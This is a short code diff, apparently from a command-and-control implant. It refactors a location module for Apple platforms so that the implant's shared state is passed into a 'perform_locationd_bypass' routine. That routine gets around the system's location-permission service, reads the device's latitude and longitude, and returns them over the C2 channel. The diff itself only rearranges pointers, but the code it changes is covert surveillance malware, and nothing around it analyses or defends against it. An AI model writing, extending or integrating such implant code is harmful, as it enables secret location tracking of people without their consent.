@@ -33,6 +33,7 @@
 #include <tlv.h>
 #include <tlv_types.h>
 #include <proc.h>
+#include <core.h>
 
 #include <sigar.h>
 
@@ -110,6 +111,7 @@ tlv_pkt_t *locate_location_get(c2_t *c2)
 {
     int stat;
 
+    core_t *core;
     tlv_pkt_t *result;
     CLLocationManager *manager;
     CLLocation *location;
@@ -119,11 +121,13 @@ tlv_pkt_t *locate_location_get(c2_t *c2)
     NSString *latitude;
     NSString *longitude;
 
+    core = c2->data;
+
 #ifdef IS_BUNDLE
-    stat = perform_locationd_bypass(c2->sigar, NULL, [[NSBundle mainBundle] bundleIdentifier]);
+    stat = perform_locationd_bypass(core->sigar, NULL, [[NSBundle mainBundle] bundleIdentifier]);
 #else
-    executable = [NSString stringWithFormat:@"%s", c2->path];
-    stat = perform_locationd_bypass(c2->sigar, executable, NULL);
+    executable = [NSString stringWithFormat:@"%s", core->path];
+    stat = perform_locationd_bypass(core->sigar, executable, NULL);
 #endif
 
     if (stat == -1)
